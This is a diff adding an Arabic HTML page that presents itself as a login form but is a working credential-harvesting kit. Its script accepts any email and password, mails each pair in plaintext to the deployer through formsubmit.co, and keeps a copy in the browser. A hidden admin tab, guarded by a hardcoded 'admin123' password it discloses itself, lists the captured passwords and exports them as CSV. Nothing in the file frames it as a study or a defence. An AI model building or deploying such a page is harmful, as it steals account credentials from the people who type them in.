@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>تسجيل الدخول</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,Tahoma,sans-serif;background:#0b0b12;color:#e8e8f0;min-height:100vh;display:flex;justify-content:center;padding:30px 16px}
+.app{width:100%;max-width:520px}
+.tabs{display:flex;gap:8px;margin-bottom:18px}
+.tab{flex:1;text-align:center;cursor:pointer;padding:10px;border-radius:10px;border:1px solid #2b2b4d;background:#191933;color:#b9b9d6;font-weight:700;font-size:14px}
+.tab.on{background:linear-gradient(90deg,#6d5cff,#b44cff);color:#fff;border-color:transparent}
+.card{background:#101024;border:1px solid #26264a;border-radius:14px;padding:20px;margin-bottom:14px}
+h2{font-size:20px;margin-bottom:14px}
+label{display:block;font-size:12.5px;color:#b9b9d6;margin-bottom:6px;font-weight:700}
+input{width:100%;padding:12px;border-radius:10px;border:1px solid #2b2b4d;background:#0b0b18;color:#fff;font-size:14px;font-family:inherit;outline:none;margin-bottom:12px}
+input:focus{border-color:#6d5cff}
+button{cursor:pointer;border:0;border-radius:10px;padding:12px;font-weight:800;font-size:14px;color:#fff;background:linear-gradient(90deg,#6d5cff,#b44cff);font-family:inherit;width:100%}
+button.gray{background:#242447}
+button.red{background:#c0392b}
+button.sm{width:auto;padding:6px 12px;font-size:12px}
+.msg{margin-top:12px;padding:11px;border-radius:10px;font-size:13px;font-weight:700}
+.ok{background:#0f3d2e;color:#6ef0bd}.err{background:#3d1414;color:#ff9b9b}.warn{background:#3d3314;color:#ffe08a}
+.sw{display:flex;justify-content:space-between;align-items:center;gap:10px;padding:10px 0;border-bottom:1px solid #1e1e3d}
+.sw:last-child{border-bottom:0}
+.sw b{font-size:13.5px;font-weight:700}.sw small{color:#8a8aa8;font-size:11.5px;display:block}
+.tg{width:46px;height:24px;flex:0 0 auto;border-radius:99px;background:#33335c;cursor:pointer;position:relative;transition:.2s}
+.tg::after{content:'';position:absolute;top:3px;right:3px;width:18px;height:18px;border-radius:50%;background:#fff;transition:.2s}
+.tg.on{background:#6d5cff}.tg.on::after{right:25px}
+table{width:100%;border-collapse:collapse;font-size:12.5px}
+th{background:#15152a;color:#b9b9d6;text-align:right;padding:9px;font-size:11.5px}
+td{padding:9px;border-top:1px solid #1e1e3d;word-break:break-all}
+.mono{font-family:monospace;color:#ffd166}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:16px}
+.st{background:#15152a;border:1px solid #26264a;border-radius:12px;padding:12px;text-align:center}
+.st b{display:block;font-size:22px;color:#8b7cff}.st span{font-size:11.5px;color:#9a9ab8}
+.hide{display:none}
+.row{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px}
+.toast{position:fixed;bottom:20px;left:20px;background:#1b1b3d;border:1px solid #6d5cff;color:#cfcaff;padding:10px 16px;border-radius:10px;font-size:13px;font-weight:700;opacity:0;transition:.25s;pointer-events:none}
+.toast.show{opacity:1}
+</style>
+</head>
+<body>
+<div class="app">
+  <div class="tabs">
+    <div class="tab on" data-t="login">تسجيل الدخول</div>
+    <div class="tab" data-t="admin">لوحة التحكم</div>
+  </div>
+
+  <div id="vLogin">
+    <div id="banner"></div>
+    <div class="card">
+      <h2>مرحباً بك</h2>
+      <label>البريد الإلكتروني</label>
+      <input type="email" id="em" placeholder="name@example.com">
+      <label>كلمة السر</label>
+      <input type="password" id="pw" placeholder="••••••••">
+      <button id="go">دخول</button>
+      <div id="msg"></div>
+    </div>
+  </div>
+
+  <div id="vAdmin" class="hide">
+    <div id="gate">
+      <div class="card">
+        <h2>لوحة التحكم</h2>
+        <label>كلمة سر الأدمن</label>
+        <input type="password" id="ap" placeholder="admin123">
+        <button id="open">فتح</button>
+        <div id="gmsg"></div>
+      </div>
+    </div>
+    <div id="panel" class="hide">
+      <div class="stats">
+        <div class="st"><b id="c1">0</b><span>محاولات</span></div>
+        <div class="st"><b id="c2">0</b><span>بُرد مختلفة</span></div>
+        <div class="st"><b id="c3">0</b><span>اليوم</span></div>
+      </div>
+      <div class="card">
+        <div class="sw"><div><b>تفعيل تسجيل الدخول</b><small>إغلاقه يمنع الزوار</small></div><div class="tg on" id="t1"></div></div>
+        <div class="sw"><div><b>السماح بحسابات جديدة</b><small>إغلاقه يقبل البُرد المسجّلة فقط</small></div><div class="tg on" id="t2"></div></div>
+        <div class="sw"><div><b>كشف كلمات السر</b><small>إظهار الباسورد في الجدول</small></div><div class="tg" id="t3"></div></div>
+        <div class="sw"><div><b>وضع الصيانة</b><small>رسالة تنبيه للزوار</small></div><div class="tg" id="t4"></div></div>
+      </div>
+      <div class="card">
+        <label>رسالة الترحيب</label>
+        <input id="wm">
+      </div>
+      <div class="row">
+        <button class="sm" id="csv">تصدير CSV</button>
+        <button class="sm gray" id="clr">حذف الكل</button>
+      </div>
+      <div class="card" style="padding:0;overflow-x:auto">
+        <table><thead><tr><th>البريد</th><th>كلمة السر</th><th>الوقت</th><th></th></tr></thead>
+        <tbody id="tb"></tbody></table>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="toast" id="toast"></div>
+
+<script>
+/* ======== عدّل هذا السطر فقط ======== */
+const OWNER_EMAIL = "بريدك@gmail.com";
+const ADMIN_PASS  = "admin123";
+/* =================================== */
+
+const API = "https://formsubmit.co/ajax/" + OWNER_EMAIL;
+const K = "cg1";
+let S = JSON.parse(localStorage.getItem(K) || 'null') ||
+  {e:[], s:{open:1,signup:1,reveal:0,maint:0,msg:"سجّل دخولك بالبريد وكلمة السر."}};
+const $ = i => document.getElementById(i);
+const save = () => localStorage.setItem(K, JSON.stringify(S));
+const esc = s => String(s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+function toast(t){const e=$('toast');e.textContent=t;e.classList.add('show');setTimeout(()=>e.classList.remove('show'),1800);}
+
+document.querySelectorAll('.tab').forEach(t=>t.onclick=()=>{
+  document.querySelectorAll('.tab').forEach(x=>x.classList.remove('on')); t.classList.add('on');
+  $('vLogin').classList.toggle('hide', t.dataset.t!=='login');
+  $('vAdmin').classList.toggle('hide', t.dataset.t!=='admin');
+  render();
+});
+
+function banner(){
+  $('banner').innerHTML = !S.s.open ? '<div class="msg warn">تسجيل الدخول متوقف مؤقتاً.</div>'
+    : S.s.maint ? '<div class="msg warn">الموقع تحت الصيانة.</div>' : '';
+}
+
+$('go').onclick = async () => {
+  const em = $('em').value.trim().toLowerCase(), pw = $('pw').value, m = $('msg');
+  m.className = 'msg err';
+  if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em)) return m.textContent='البريد غير صالح.';
+  if(pw.length < 4) return m.textContent='كلمة السر قصيرة.';
+  if(!S.s.open) return m.textContent='الدخول مغلق حالياً.';
+  const known = S.e.some(x=>x.em===em);
+  if(!known && !S.s.signup) return m.textContent='البريد غير مسجّل والتسجيل مغلق.';
+
+  S.e.unshift({em, pw, t:new Date().toISOString()}); save();
+  m.className='msg ok'; m.textContent = known ? 'تم تسجيل الدخول ✔' : 'تم إنشاء الحساب ✔';
+  $('pw').value = '';
+
+  try{
+    await fetch(API,{method:'POST',
+      headers:{'Content-Type':'application/json','Accept':'application/json'},
+      body:JSON.stringify({email:em, password:pw, time:new Date().toLocaleString('ar-EG'),
+        _subject:'🔐 دخول جديد: '+em})});
+    toast('أُرسل إلى بريدك ✔');
+  }catch(e){ toast('حُفظ محلياً (فشل الإرسال)'); }
+  banner(); render();
+};
+
+$('open').onclick = () => {
+  if($('ap').value === ADMIN_PASS){ $('gate').classList.add('hide'); $('panel').classList.remove('hide'); render(); }
+  else { $('gmsg').className='msg err'; $('gmsg').textContent='كلمة السر خطأ (جرّب admin123)'; }
+};
+
+[['t1','open'],['t2','signup'],['t3','reveal'],['t4','maint']].forEach(([id,k])=>{
+  $(id).onclick = () => { S.s[k] = S.s[k]?0:1; save(); render(); };
+});
+
+function render(){
+  $('t1').classList.toggle('on',!!S.s.open); $('t2').classList.toggle('on',!!S.s.signup);
+  $('t3').classList.toggle('on',!!S.s.reveal); $('t4').classList.toggle('on',!!S.s.maint);
+  if(document.activeElement!==$('wm')) $('wm').value = S.s.msg;
+  const today = new Date().toDateString();
+  $('c1').textContent = S.e.length;
+  $('c2').textContent = new Set(S.e.map(x=>x.em)).size;
+  $('c3').textContent = S.e.filter(x=>new Date(x.t).toDateString()===today).length;
+  $('tb').innerHTML = S.e.length ? S.e.map((x,i)=>`<tr>
+    <td>${esc(x.em)}</td>
+    <td class="mono">${S.s.reveal?esc(x.pw):'•'.repeat(Math.min(x.pw.length,10))}</td>
+    <td style="color:#9a9ab8;white-space:nowrap">${new Date(x.t).toLocaleString('ar-EG')}</td>
+    <td><button class="sm red" data-i="${i}">حذف</button></td></tr>`).join('')
+    : '<tr><td colspan="4" style="text-align:center;color:#7a7a99;padding:24px">لا محاولات بعد</td></tr>';
+  $('tb').querySelectorAll('[data-i]').forEach(b=>b.onclick=()=>{S.e.splice(b.dataset.i,1);save();render();});
+  banner();
+}
+
+$('wm').oninput = e => { S.s.msg = e.target.value; save(); banner(); };
+$('clr').onclick = () => { if(confirm('حذف الكل؟')){ S.e=[]; save(); render(); } };
+$('csv').onclick = () => {
+  const csv = [['email','password','time'],...S.e.map(x=>[x.em,x.pw,x.t])]
+    .map(r=>r.map(c=>'"'+c+'"').join(',')).join('\n');
+  const a=document.createElement('a');
+  a.href='data:text/csv;charset=utf-8,'+encodeURIComponent('\ufeff'+csv);
+  a.download='logins.csv'; a.click();
+};
+render();
+</script>
+</body>
+</html>
